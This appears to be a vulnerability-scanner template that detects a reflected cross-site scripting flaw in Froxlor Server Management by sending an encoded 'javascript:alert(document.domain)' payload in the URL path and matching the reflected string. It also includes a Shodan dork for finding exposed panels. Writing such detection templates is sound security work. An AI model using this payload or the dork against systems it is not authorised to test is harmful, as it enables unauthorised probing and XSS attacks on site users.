id: froxlor-xss

info:
  name: Froxlor Server Management - Cross Site Scripting
  author: tess
  severity: medium
  description: |
    The user must click the forgot password link in order to execute this XSS.
  metadata:
    verified: true
    shodan-dork: title:"Froxlor Server Management Panel"
  tags: froxlor,xss

requests:
  - method: GET
    path:
      - '{{BaseURL}}/index.php/javascript%26colon%3Balert(document.domain);dd%26sol%3b%26sol%3b'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "javascript&colon;alert(document.domain);dd&sol;&sol;"
          - "Froxlor"
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
